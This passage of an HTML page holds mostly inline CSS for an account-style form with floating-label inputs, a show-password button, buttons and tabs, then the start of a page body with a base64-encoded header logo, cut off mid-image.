    font-weight: normal;
    font-size: 25px;
  }

  select {
    width: 100px;
    outline: none;
    /* padding: 5px; */
    margin-top: 3px;
    font-size: 14px;
    border: solid 1px #C3DEE7;
    /* border-radius: 4px; */
    background-color: #FFFFFF;
    width: 60px;
  }

  p {
    color: #333;
    font-size: 14px;
  }

  .white {
    background: #fff;
  }

  @media (max-width: 940px) {
    .center {
      padding-left: 20px;
      padding-right: 20px;
    }
  }

  .gray {
    background: #FAFAFA;
    padding-top: 40px;
  }

  .main-title {
    font-size: 22px;
    margin-right: 12px;
    color: #323232;
    display: inline-block;
    font-weight: bold;
  }

  .secondary-title {
    font-size: 16px;
    padding-left: 12px;
    border-left: solid 2px #181818;
    font-weight: 600;
    display: inline-block;
  }

  .title-description,
  .title-description_persistent {
    font-size: 12px;
    color: #6F7779;
    font-weight: 500;
    line-height: 20px;
    margin-bottom: 10px;
  }

  .form-container {
    position: relative;
    box-shadow: 0 0 4px rgba(0, 0, 0, 0.25);
    background-color: #FFFFFF;
    border-radius: 8px;
    padding: 20px 40px 30px;
    margin-bottom: 20px;
  }

  .input-field:hover,
  .input-field_select:hover {
    border-color: #9BC3D3;
  }

  .input-field,
  .input-field_select {
    height: 50px;
    width: 340px;
    max-width: 100%;
    padding: 0 0 0 15px;
    font-size: 16px;
    border: solid 1px #C3DEE7;
    border-radius: 4px;
    background-color: #FFFFFF;
    transition: 140ms;
  }

  .input-field:placeholder-shown~.floating-label {
    position: absolute;
    font-size: 19px;
    left: 15px;
    top: 13px;
    padding: 0;
    color: rgba(0, 0, 0, 0.6);
    transition: 140ms;
    pointer-events: none;
  }

  .floating-label {
    position: absolute;
    font-size: 16px;
    left: 15px;
    top: 19px;
    color: rgba(0, 0, 0, 0.6);
    transition: 140ms;
    pointer-events: none;
  }

  .input-field:placeholder-shown~.floating-label {
    position: absolute;
    font-size: 16px;
    left: 15px;
    top: 19px;
    padding: 0;
    color: rgba(0, 0, 0, 0.6);
    transition: 140ms;
    pointer-events: none;
  }

  .inputDiv label {
    padding-top: 5px;
    display: inline-block;
  }

  .input-div {
    position: relative;
    margin: 30px 0 20px;
    max-width: max-content;
  }

  .input-field:focus,
  .input-field_select:focus {
    transition: 50ms;
    border: 2px solid #137E84;
  }

  .input-field:focus~.floating-label,
  .input-field_select:focus~.floating-label {
    color: #137E84;
    font-weight: 600;
  }

  .input-field:focus~.floating-label,
  .input-field_select:focus~.floating-label {
    background-color: #FFFFFF;
    top: -4px;
    left: 10px;
    padding: 0 5px;
    font-size: 12px;
    opacity: 1;
  }

  .display-block {
    display: block;
  }

  .gray-link {
    font-size: 12px;
    font-weight: 600;
    color: #6F7779;
    margin: 20px 20px 0 0;
    cursor: pointer;
    text-align: left;
    transition: color 140ms;
    white-space: pre;
  }

  a {
    text-decoration: none;
  }

  .form-main-buttons,
  .form-main-buttons_outside {
    margin: 40px 0 20px;
    min-height: 40px;
  }

  .alt-button-red {
    color: #EC0000;
  }

  .alt-button-red,
  .alt-button-blue {
    font-size: 13px;
    font-weight: 600;
    line-height: 40px;
    cursor: pointer;
    transition: color 140ms;
  }

  .square-button-red {
    background-color: #EC0000;
    float: right;
  }

  .square-button-red,
  .square-button-blue,
  .main-button-disabled,
  .disabled-button,
  .main-button-blue {
    font-size: 14px;
    font-weight: 600;
    height: 40px;
    padding: 0 30px;
    border-radius: 20px;
    color: #FFFFFF;
    cursor: pointer;
    transition: background-color 140ms;
  }

  .input-div>.show-password-button {
    position: absolute;
    top: 24px;
    right: 15px;
    transform: translateY(-50%);
    color: silver;
  }

  .show-password-button {
    display: inline-block;
    width: 30px;
    height: 25px;
    stroke-width: 0;
    stroke: #757575;
    fill: #757575;
    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAABzCAYAAAABrDkfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RTVCMDREMjAyRkQyMTFFQkJFRDJDRkVDNzVEQUI0RTIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RTVCMDREMjEyRkQyMTFFQkJFRDJDRkVDNzVEQUI0RTIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFNUIwNEQxRTJGRDIxMUVCQkVEMkNGRUM3NURBQjRFMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFNUIwNEQxRjJGRDIxMUVCQkVEMkNGRUM3NURBQjRFMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pn4GTkkAABlOSURBVHja7J0HWBTX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);
    cursor: pointer;
    background-size: 49%;
    transition: opacity 200ms;
    background-repeat: no-repeat;
    background-position: center;
    margin-top: 2px;
  }

  .input-field:not(:optional):valid~.floating-label {
    background-color: #FFFFFF;
    top: -4px;
    left: 10px;
    padding: 0 5px;
    font-size: 12px;
    opacity: 1;
  }

  div#ccQuery {
    position: relative;
    box-shadow: 0 0 4px rgba(0, 0, 0, 0.25);
    background-color: #FFFFFF;
    border-radius: 8px;
    padding: 43px 40px 30px;
    margin-bottom: 20px;
  }

  .tab {
    overflow: hidden;
    border: 1px solid #ccc;
    background-color: #f1f1f1;
  }

  /* Style the buttons that are used to open the tab content */
  .tab button {
    background-color: inherit;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    transition: 0.3s;
  }

  /* Change background color of buttons on hover */
  .tab button:hover {
    background-color: #ddd;
  }

  /* Create an active/current tablink class */
  .tab button.active {
    background-color: #ccc;
  }

  /* Style the tab content */
  .tabcontent {
    display: none;
    padding: 6px 12px;
    border: 1px solid #ccc;
    border-top: none;
  }

  .body {
    width: 768px;
    margin: auto;
  }

  .d-flex {
    display: flex;
  }

  .justify-content-start {
    justify-content: flex-start;
  }

  .justify-content-end {
    justify-content: flex-end;
  }

  .justify-content-center {
    justify-content: center;
  }

  .justify-content-between {
    justify-content: space-between;
  }

  .justify-content-around {
    justify-content: space-around;
  }

  .align-items-start {
    align-items: flex-start;
  }

  .align-items-end {
    align-items: flex-end;
  }

  .align-items-center {
    align-items: center;
  }

  .home-header {
    margin-top: 50px;
  }

  .font-12 {
    font-size: 12px
  }

  .color-green {
    color: #006633;
  }

  .bg-green {
    background-color: #006633;
  }

  .mt-50 {
    margin-top: 50px;
  }

  .mt-20 {
    margin-top: 20px;
  }

  .mt-10 {
    margin-top: 10px;
  }
  </style>
  <link rel="stylesheet" href="styles.css">
</head>

<body>
  <div class="body" id="body_div">
    <div class="home-header d-flex justify-content-between align-items-end">
      <img
        src="data:image/png;base64,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